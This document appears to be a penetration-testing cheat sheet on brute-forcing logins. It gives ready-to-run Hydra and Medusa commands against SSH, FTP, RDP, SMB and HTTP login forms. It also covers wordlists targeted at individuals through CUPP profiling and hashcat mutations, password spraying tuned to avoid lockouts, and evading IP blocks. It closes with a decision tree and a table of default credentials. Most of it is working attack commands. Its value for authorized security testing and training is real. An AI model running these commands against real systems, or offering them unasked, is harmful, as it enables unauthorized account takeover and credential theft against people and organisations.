# Login Brute Forcing Methodology

---

## 1. Wordlist Preparation

### Filter Wordlist to Password Policy
```bash
# Step by step
grep -E '^.{8,}$' wordlist.txt > minlength.txt       # Min 8 chars
grep -E '[A-Z]' minlength.txt > uppercase.txt          # Has uppercase
grep -E '[a-z]' uppercase.txt > lowercase.txt           # Has lowercase
grep -E '[0-9]' lowercase.txt > number.txt              # Has digit
wc -l number.txt

# One-liner (min 8, upper, lower, digit)
grep -E '^.{8,}$' wl.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt

# Add special character requirement (2+ from !@#$%^&*)
grep -E '([!@#$%^&*].*){2,}' filtered.txt > policy.txt
```

### Adapt the Grep Chain to Any Policy
| Requirement | grep Filter |
|-------------|------------|
| Min N chars | `grep -E '^.{N,}$'` |
| Max N chars | `grep -E '^.{1,N}$'` |
| Has uppercase | `grep -E '[A-Z]'` |
| Has lowercase | `grep -E '[a-z]'` |
| Has digit | `grep -E '[0-9]'` |
| Has 1+ special | `grep -E '[^a-zA-Z0-9]'` |
| Has 2+ special from set | `grep -E '([!@#$%^&*].*){2,}'` |
| No spaces | `grep -v ' '` |

---

## 2. Custom Wordlist Generation

### Username Anarchy — Generate Usernames from Names
```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generate from a name
./username-anarchy Jane Smith > jane_smith_usernames.txt

# List available plugins
./username-anarchy -l

# From a file of names (first last per line)
./username-anarchy --input-file names.txt > all_usernames.txt
```

### CUPP — Targeted Password Profiler
```bash
sudo apt install cupp -y
cupp -i    # Interactive — asks about target's info (name, DOB, pet, etc.)
# Generates: jane.txt

# Then filter to policy
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

### Hashcat Rule-Based Mutations
```bash
# Apply best64 rules to a wordlist
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Stack multiple rule files
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule > combined.txt

# Apply to CUPP output then filter to policy
hashcat --stdout jane.txt -r /usr/share/hashcat/rules/best64.rule > jane-mutated.txt
grep -E '^.{8,}$' jane-mutated.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > jane-final.txt
```

### Common Rule Files
| Rule File | Effect | Location |
|-----------|--------|----------|
| `best64.rule` | 64 most effective mutations | `/usr/share/hashcat/rules/` |
| `rockyou-30000.rule` | Massive mutation set | `/usr/share/hashcat/rules/` |
| `dive.rule` | Dive-style mutations | `/usr/share/hashcat/rules/` |
| `toggles1.rule` — `toggles5.rule` | Upper/lowercase toggles | `/usr/share/hashcat/rules/` |
| `OneRuleToRuleThemAll.rule` | Community favourite | Download separately |

---

## 3. Hydra

### Syntax
```bash
hydra [login_opts] [pass_opts] [attack_opts] service://target [service_opts]
```

### Flags
| Flag | Purpose |
|------|---------|
| `-l USER` / `-L FILE` | Single user / user list |
| `-p PASS` / `-P FILE` | Single pass / pass list |
| `-t N` | Parallel tasks (default 16) |
| `-f` | Stop after first valid hit |
| `-s PORT` | Custom port |
| `-v` / `-V` | Verbose / show each attempt |
| `-M FILE` | Multiple targets from file |
| `-W N` | Wait N seconds between attempts |
| `-x MIN:MAX:CHARSET` | Character-set brute-force |
| `-e nsr` | Try null password (n), user=pass (s), reverse (r) |

### Service Cheatsheet
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET

# FTP
hydra -l admin -P pass.txt ftp://TARGET

# RDP
hydra -l admin -P pass.txt rdp://TARGET

# MySQL
hydra -l root -P pass.txt mysql://TARGET

# SMB
hydra -l admin -P pass.txt smb://TARGET

# SMTP
hydra -l user -P pass.txt smtp://TARGET

# POP3
hydra -l user -P pass.txt pop3://TARGET

# Multiple targets
hydra -l root -p toor -M targets.txt ssh
```

### HTTP Basic Auth
```bash
hydra -l admin -P pass.txt TARGET http-get / -s 81
```

### HTTP POST Form
```bash
hydra -l admin -P pass.txt TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Syntax breakdown**: `/path:post_data:condition`
- `^USER^` → replaced with username
- `^PASS^` → replaced with password
- **Condition** (pick ONE):
  - `F=Invalid credentials` → failure string (if page contains this = failed login)
  - `S=302` → success string (if page contains this = successful login)
  - `S=Dashboard` → success keyword

### Character-Set Brute Force (no wordlist)
```bash
# 6-8 chars, mixed case + digits
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
  TARGET rdp
```

---

## 4. Medusa

### Syntax
```bash
medusa [target_opts] [cred_opts] -M module [module_opts]
```

### Flags
| Flag | Purpose |
|------|---------|
| `-h HOST` / `-H FILE` | Single host / host list |
| `-u USER` / `-U FILE` | Single user / user list |
| `-p PASS` / `-P FILE` | Single pass / pass list |
| `-M MODULE` | Service module |
| `-m "OPTS"` | Module-specific options |
| `-t N` | Parallel tasks |
| `-f` / `-F` | Stop on first hit (per host / any host) |
| `-n PORT` | Custom port |
| `-e ns` | Try empty (n) and user=pass (s) |

### Examples
```bash
# SSH
medusa -h TARGET -n 22 -u sshuser -P passwords.txt -M ssh -t 3

# FTP
medusa -h TARGET -u ftpuser -P passwords.txt -M ftp -t 5

# HTTP Basic Auth (web-form module)
medusa -h TARGET -U users.txt -P pass.txt -M web-form \
  -m FORM:"username=^USER^&password=^PASS^:F=Invalid"

# Empty / default password check
medusa -h TARGET -U users.txt -e ns -M ssh
```

### Hydra vs Medusa
| Feature | Hydra | Medusa |
|---------|-------|--------|
| Speed | Very fast | Fast, more stable parallel |
| Protocols | More modules | Fewer but cleaner syntax |
| HTTP forms | `http-post-form` | `-M web-form -m FORM:` |
| Multi-host | `-M targets.txt` | `-H targets.txt` (more stable) |
| Best for | General brute-force | Large-scale, multi-host |

---

## 5. Login Form Recon

### Step 1: Identify the Form
- [ ] Right-click → Inspect Element on the login form
- [ ] Find `<form>` tag: note `action="/login"` and `method="POST"`
- [ ] Note `<input>` field `name` attributes (e.g., `username`, `password`, `csrf_token`)

### Step 2: Capture a Login Request
- [ ] Open DevTools → Network tab (F12)
- [ ] Submit a bad login (admin / wrongpassword)
- [ ] Click the POST request → inspect Form Data
- [ ] Copy the exact parameter names and values

### Step 3: Identify the Failure Indicator
```bash
# Send a known-bad login and capture the error message
curl -s -i -X POST http://TARGET/login \
  -d "user=admin&pass=WRONG" | grep -i "error\|invalid\|incorrect\|failed"
```
- [ ] Note the exact failure string (e.g., "Invalid credentials")
- [ ] Use this as `F=<string>` in Hydra

### Step 4: Check for CSRF Tokens
- [ ] Is there a hidden `<input name="csrf_token" value="...">`?
- [ ] If yes: extract it first, include as static field
- [ ] Hydra syntax with CSRF: `/login:csrf=TOKEN&user=^USER^&pass=^PASS^:F=Invalid`

### Step 5: Check for Account Lockout
- [ ] Try 5-10 rapid bad logins manually
- [ ] Does the account lock? After how many? For how long?
- [ ] If lockout exists → use password spraying instead (Section 7)

---

## 6. Full Brute-Force Attack Flow

### Against Basic HTTP Auth
```bash
# Identify — look for 401 + WWW-Authenticate: Basic in response
curl -v http://TARGET/ 2>&1 | grep -i "www-authenticate\|401"

# Attack with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://TARGET/ -s PORT

# Manual test of found creds
curl -u admin:foundpass http://TARGET/
curl -H "Authorization: Basic $(echo -n 'admin:foundpass' | base64)" http://TARGET/
```

### Against Login Forms
```bash
# 1. Recon the form (see Section 5)
# 2. Get the failure string
curl -s -X POST http://TARGET/login -d "user=admin&pass=WRONG" | grep -i error

# 3. Build and run Hydra
hydra -L users.txt -P pass.txt -f TARGET -s PORT \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### With Custom CUPP + Mutations
```bash
# 1. Generate targeted wordlist
cupp -i                                                    # → target.txt
# 2. Mutate
hashcat --stdout target.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
# 3. Filter to policy
grep -E '^.{8,}$' mutated.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > final.txt
# 4. Generate usernames
./username-anarchy Jane Smith > usernames.txt
# 5. Attack
hydra -L usernames.txt -P final.txt -f TARGET -s PORT \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

---

## 7. Password Spraying (Lockout-Safe)

**Concept**: One password against many users (instead of many passwords against one user).

```bash
# SSH — one password at a time, slow
hydra -L users.txt -p 'Winter2024!' TARGET ssh -t 1 -W 5
# -t 1  → 1 thread (one attempt at a time)
# -W 5  → 5 second wait between attempts

# HTTP POST form — spray one password
hydra -L users.txt -p 'Company2024!' TARGET -s PORT \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 1 -W 5
```

### Spray Strategy
- [ ] Enumerate valid usernames first (user enumeration via error message differences)
- [ ] Build a small password list: `Season+Year!`, `CompanyName1!`, `Welcome1!`, `Password1!`
- [ ] One password at a time → wait → next password
- [ ] Monitor for lockouts between sprays
- [ ] `-t 1 -W 5` is the safe default (1 thread, 5 sec wait)

---

## 8. Debugging False Positives

### Problem: Every Password Shows as Valid
This means your failure string (`F=`) is wrong.

```bash
# Step 1: Manually send a bad login
curl -s -i -X POST http://TARGET/login \
  -d "user=admin&pass=DEFINITELYWRONG" | grep -i "error\|invalid\|incorrect\|fail\|wrong"

# Step 2: Use the EXACT error string
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=<paste exact string>"

# Step 3: Or use success condition instead
# If successful login redirects to /dashboard:
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=dashboard"
```

### Common Issues
| Problem | Fix |
|---------|-----|
| All passwords "valid" | Wrong `F=` string — re-check with curl |
| No results at all | Wrong field names — check with Burp/DevTools |
| Connection errors | Lower threads: `-t 4` |
| CSRF blocking | Extract token, add to params |
| IP blocked | Use proxy, lower speed `-t 1 -W 10` |
| Redirect confusion | Try `S=302` or `S=Location:` |

---

## 9. Decision Tree

```
Login Target Found
├── What type of auth?
│   ├── Basic HTTP Auth (401 + WWW-Authenticate: Basic)
│   │   └── hydra -l user -P list TARGET http-get /
│   ├── Login Form (POST)
│   │   ├── Inspect form (field names, action, method)
│   │   ├── Capture failure string with curl
│   │   ├── Check for CSRF token
│   │   └── hydra ... http-post-form "/path:params:F=string"
│   └── SSH / FTP / RDP / other service
│       └── hydra -l user -P list service://TARGET
│
├── Wordlist strategy?
│   ├── Generic → rockyou.txt filtered to policy
│   ├── Targeted → CUPP + hashcat mutations + policy filter
│   └── Username unknown → username-anarchy from real names
│
├── Lockout risk?
│   ├── No lockout → full brute-force (-t 16)
│   └── Lockout exists → password spray (-t 1 -W 5, one pass at a time)
│
├── Getting false positives?
│   └── Re-check F= string with curl, or switch to S= success condition
│
└── Still no access?
    ├── Try default creds (admin:admin, admin:password, etc.)
    ├── Try empty password: -e ns
    ├── Try user=pass: -e s
    └── Try other services on same creds (credential stuffing)
```

---

## 10. Quick Reference — Common Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| SSH | root | toor, root, password |
| FTP | anonymous | (blank), anonymous |
| MySQL | root | (blank), root, mysql |
| PostgreSQL | postgres | postgres |
| Tomcat | tomcat | tomcat, s3cret, admin |
| Jenkins | admin | admin, password |
| WordPress | admin | admin, password |
| phpMyAdmin | root | (blank), root |
| SNMP | - | public, private (community strings) |

> Always try default creds and `admin:admin` before brute-forcing.
